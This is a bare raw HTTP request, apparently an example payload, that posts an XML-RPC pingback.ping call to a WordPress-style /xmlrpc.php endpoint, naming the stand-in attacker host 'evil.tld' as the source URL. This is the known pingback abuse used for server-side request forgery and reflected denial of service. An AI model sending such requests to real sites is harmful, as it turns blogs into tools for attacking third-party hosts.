POST /xmlrpc.php HTTP/1.1
Host: blog.tld
[...]
<methodCall>
   <methodName>pingback.ping</methodName>
  <params>
    <param>
      <value><string>http://evil.tld</string></value>
    </param>
    <param>
      <value><string>http://blog.tld/?p=1</string></value>
    </param>
  </params>
</methodCall>
